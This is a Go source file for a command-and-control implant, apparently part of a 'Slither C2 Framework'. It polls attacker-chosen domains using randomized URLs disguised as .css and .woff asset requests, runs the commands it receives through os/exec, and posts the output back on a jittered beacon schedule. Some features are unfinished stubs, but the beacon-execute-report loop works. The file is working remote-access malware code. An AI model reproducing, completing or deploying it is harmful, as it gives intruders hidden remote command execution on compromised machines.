// Package agent provides a C2 agent compatible with the Slither C2 Framework
package agent

import (
	"bytes"
	"context"
	_ "embed" // Has hte underscore as it is only being used for side efects
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"slices"
	"strings"
	"time"
)

// Agent represents a single C2 agent that can operate in a beacon or long-poll mode
// There is only a single Agent declared for each class
type Agent struct {
	domains           []string
	mode              string // l for long-pool, b for beacon
	stayAlive         bool
	activeDomain      string
	client            *http.Client
	beaconInter       int
	watchdogTimer     int
	modificationCheck bool
}

// agentConfig is the complete configuration structure of contents to be loaded from agent_config.json
type agentConfig struct {
	Domains        []string                     `json:"domains"`
	BeaconTimer    int                          `json:"beacon_timer"`
	WatchdogTimer  int                          `json:"watchdog_timer"`
	URLExtensions  URLExtensions                `json:"url_extensions"`
	URLParameters  URLParameters                `json:"url_parameters"`
	FileExtensions map[string]FileExtensionInfo `json:"file_extensions"`
}

// URLExtensions is for path segments to create realistic URLS, file extension agnostic
type URLExtensions struct {
	CommonPaths    []string `json:"common_paths"`
	RandomSegments []string `json:"random_segments"`
}

// URLParameters is for parameters to create realistic URLs, file extension agnostic
type URLParameters struct {
	CommonParams    []string `json:"common_params"`
	TimestampValues []string `json:"timestamp_values"`
	VersionValues   []string `json:"version_values"`
	HashValues      []string `json:"hash_values"`
}

// FileExtensionInfo is for generating realistic fileNames, is NOT file extension agnostic
type FileExtensionInfo struct {
	Paths     []string `json:"paths"`
	Params    []string `json:"params"`
	Filenames []string `json:"filenames"`
}

func ExtractAndCreateAgent(configData []byte) (*Agent, *agentConfig, error) {
	ac, err := extractAgentConfig(configData)
	if err != nil {
		fmt.Print(err)
		return nil, ac, err
	}
	agent := newAgent(ac.Domains, "b", ac.BeaconTimer, ac.WatchdogTimer)
	return agent, ac, err
}

// NewAgent creates a new Agent
// All parameters for rendering an agent should be inputted.
func newAgent(domains []string, mode string, beaconTimer int, watchdogTimer int) *Agent {
	// Sesssion is not inputted as that is handled by modification commands
	return &Agent{
		domains:           domains,
		mode:              "b",
		stayAlive:         true,
		activeDomain:      domains[0],
		client:            &http.Client{Timeout: 30 * time.Second},
		beaconInter:       beaconTimer,
		watchdogTimer:     watchdogTimer,
		modificationCheck: false,
	}
}

// extractAgentConfig() extracts the agent config from the json
// uses the agentconfig structs defined above
func extractAgentConfig(configData []byte) (*agentConfig, error) {
	var ac agentConfig

	// Unmarshal extracts text from a json and applies to to a matching struct
	// The pointer to the struct is passed in
	err := json.Unmarshal(configData, &ac)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return &ac, err
}

// COMMAND EXECUTION FUNCTIONS (System and agent modification commands)

// executeCommands takes a list of commands and executes them
func executeCommands(a *Agent, commands []string) []string {
	// TODO: Implement command execution
	commandResults := make([]string, len(commands))

	for i, command := range commands {
		result := executeCommand(a, command)
		commandResults[i] = result
	}

	return commandResults
}

// executeCommand executes a single command
func executeCommand(a *Agent, command string) string {
	commandParts := strings.Fields(command)
	if len(commandParts) == 0 {
		return "Error: empty command"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, commandParts[0], commandParts[1:]...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "Error: command timed out after 30 seconds"
		}
		return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

// modificationFlagCheck() checks to see if the flag indicating a modification to the agent should occur on the next cycle exists
func modificationFlagCheck(a *Agent, commands []string) []string {
	index := slices.Index(commands, "agent_modification")

	if index != -1 {
		commands = append(commands[:index], commands[index+1:]...)
		a.modificationCheck = true
	}

	return commands
}

// applyModificationCommands manages the whole flow of applying modification commands
func applyModificationCommands(a *Agent) bool {
	// TODO: Implement modification command application
	return false
}

// parseModificationCommands takes a list of modification commands and parses them appropriately
func parseModificationCommands(a *Agent, unparsedCommands *[]string) [][2]string {
	// TODO: Implement modification command parsing
	return nil
}

// handleModificationCommand routes modification commands to appropriate handlers to execute commands
func handleModificationCommand(a *Agent, cmdType string, cmdValue string) string {
	// TODO: Implement modification command handling
	return ""
}

// COMMUNICATION FUNCTIONS

// executeBeaconChain executes the entire chain of beaconing including execution and sending back of commands
func executeBeaconChain(a *Agent, ac *agentConfig) bool {
	if !isBeacon(a) {
		return false
	}

	commands, err := beaconIn(a, ac)
	if err != nil {
		return false
	}

	if len(commands) == 0 {
		return true
	}

	commands = modificationFlagCheck(a, commands)
	results := executeCommands(a, commands)

	status, err := beaconOut(a, ac, commands, results)
	if err != nil {
		return false
	}

	return status
}

// executePollSequence function to be called to repeatedly poll the agent
func executePollSequence(a *Agent) bool {
	// TODO: Implement long polling sequence
	return false
}

// beaconOut beacons back the output of any commands to the C2 server
func beaconOut(a *Agent, ac *agentConfig, commands []string, results []string) (bool, error) {
	// TODO: Implement beacon back functionality
	if !isBeacon(a) {
		return false, errors.New("beacon function called while agent was in long poll mode")
	}
	url, err := generateURL(a, ac, ".css")
	if err != nil {
		return false, err
	}

	payload := map[string]interface{}{
		"commands": commands,
		"results":  results,
	}

	// Marshal into a json format
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return false, err
	}

	// Create a reader
	reader := bytes.NewReader(jsonPayload)

	resp, err := a.client.Post(url, "application/json", reader)
	if err != nil {
		return false, err
	}

	defer resp.Body.Close()

	return true, nil
}

// beaconIn obtains any available commands if there are any
func beaconIn(a *Agent, ac *agentConfig) ([]string, error) {
	if !isBeacon(a) {
		return nil, errors.New("beacon function called while agent was in long poll mode")
	}
	url, err := generateURL(a, ac, ".woff")
	if err != nil {
		return nil, err
	}

	resp, err := a.client.Get(url)
	if err != nil {
		return nil, err
	}

	// close the response body
	defer resp.Body.Close()
	// Check HTTP status code
	if resp.StatusCode == 404 {
		// No commands available
		return []string{}, nil
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	var response struct {
		Commands []string `json:"commands"`
		Status   string   `json:"status"`
	}

	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return nil, err
	}

	return response.Commands, nil
}

// longPoll performs long polling request for commands
func longPoll(a *Agent) ([]string, error) {
	// Connection being held open is on the server side.
	// Timeout for the client should be extended
	if isBeacon(a) {
		return nil, errors.New("long poll method called while agent is in beacon mode")
	}
	return nil, nil
}

// longPollBack sends long poll results back to server
func longPollBack(a *Agent, commands []string, results []string) bool {
	// TODO: Implement long poll back functionality
	return false
}

// getModificationCommands sends a get request to the agent modification endpoint
func getModificationCommands(a *Agent) []string {
	// TODO: Implement modification command retrieval
	return nil
}

// sendModificationCommandResults sends modification command results back to server
func sendModificationCommandResults(a *Agent, commands []string, results []string) bool {
	// TODO: Implement sending modification results
	return false
}

// generateURL generates a randomized URL using parameters from agent_config.json
func generateURL(a *Agent, ac *agentConfig, filetype string) (string, error) {
	// Get the specific configuration for the file extension
	fileConfig, exists := ac.FileExtensions[filetype]
	if !exists {
		return "", errors.New("not a valid extension or does not exist in the config")
	}

	// Make sure that all the required parameters are available
	if len(fileConfig.Paths) == 0 || len(ac.URLExtensions.RandomSegments) == 0 || len(fileConfig.Filenames) == 0 {
		return "", errors.New("insufficient configuration data for file type")
	}

	// Generate the URL components randomly
	basePath := fileConfig.Paths[rand.Intn(len(fileConfig.Paths))]
	randomSegment := ac.URLExtensions.RandomSegments[rand.Intn(len(ac.URLExtensions.RandomSegments))]
	filename := fileConfig.Filenames[rand.Intn(len(fileConfig.Filenames))]

	// Construct the URL path
	urlPath := fmt.Sprintf("%s/%s/%s%s", basePath, randomSegment, filename, filetype)

	// Construct the full URL
	fullURL := fmt.Sprintf("http://%s%s", a.activeDomain, urlPath)

	return fullURL, nil
}

// GETTER AND SETTER COMMANDS

// removeDomain removes a domain from the list of the agents current domains
// This function will fail if there is only one domain in the list, or the domain that is requested to be removed does not exist
func removeDomain(a *Agent, domain string) error {
	if len(a.domains) < 2 {
		return errors.New("domain list only has one domain, cannot remove")
	}

	index := slices.Index(a.domains, domain)

	if index == -1 {
		return errors.New("domain is not in the domain list")
	}

	a.domains = append(a.domains[:index], a.domains[index+1:]...)

	return nil
}

// addDomain adds a domain to the list of the agents possible domains
// Errors if the domain to be added already exists
func addDomain(a *Agent, domain string) error {
	if slices.Contains(a.domains, domain) {
		return errors.New("domain already exists inside of the domain list")
	}

	a.domains = append(a.domains, domain)

	return nil
}

func setActiveDomain(a *Agent, domain string) error {
	if !slices.Contains(a.domains, domain) {
		return errors.New("domain does not exist inside of the domain list, please add it first")
	}

	a.activeDomain = domain

	return nil
}

// isAlive returns true if the agent is alive
func isAlive(a *Agent) bool {
	return a.stayAlive
}

// killAgent kills the agent by setting its aliveStatus to false
func killAgent(a *Agent) {
	a.stayAlive = false
}

// isBeacon returns true if the agent is in beacon mode
func isBeacon(a *Agent) bool {
	return a.mode == "b"
}

// setBeacon sets the agent in beacon mode
func setBeacon(a *Agent) {
	a.mode = "b"
}

// setLongpoll sets the agent in longpolling mode
func setLongpoll(a *Agent) {
	a.mode = "l"
	// TODO: A session should be set for the long polling
}

// setBeaconInter sets the beacon interval timer from a modification command
func setBeaconInter(a *Agent, interval int) error {
	if interval < 1 {
		return errors.New("interval must be a positive integer")
	}
	a.beaconInter = interval
	return nil
}

// setWatchdogTimer sets the watchdog timer
func setWatchdogTimer(a *Agent, timer int) error {
	if timer < 1 {
		return errors.New("watchdog timer must be positive integer")
	}
	a.watchdogTimer = timer
	return nil
}

// getBeaconJitter returns a random beacon as a time.Duration object with jitter applied
func getBeaconJitter(a *Agent, rangeVal float64) time.Duration {
	beaconBase := float64(a.beaconInter)
	beaconMin := beaconBase - rangeVal
	beaconMax := beaconBase + rangeVal

	// Ensure minimum is not negative
	if beaconMin < 0.1 {
		beaconMin = 0.1
	}

	// Generate random float between beaconMin and beaconMax
	jitterRange := beaconMax - beaconMin
	randomValue := beaconMin + rand.Float64()*jitterRange

	return time.Duration(randomValue * float64(time.Second))
}

func isModify(a *Agent) bool {
	return a.modificationCheck
}

//go:embed agent_config.json
var configFile []byte // Embeds the agent_config as a json

func main() {
	agent, config, err := ExtractAndCreateAgent(configFile)
	if err != nil {
		log.Fatalf("Issue with the intitialization of agent: %v", err)
	}

	// Enter agent loop
	for isAlive(agent) {

		// Check for the modification commands to the agent's nature
		if isModify(agent) {
			// TODO: Application of the modification commands

			// Check if the modification commands killed the agent
			if !isAlive(agent) {
				break
			}
		}

		if isBeacon(agent) {
			executeBeaconChain(agent, config)
			// TODO: In the future have the beaconRangeVal be in config, idc rn
			interval := getBeaconJitter(agent, 10.0)
			time.Sleep(interval)
		} else {
			for isAlive(agent) && isModify(agent) {
				executePollSequence(agent)
			}
		}

	}
}
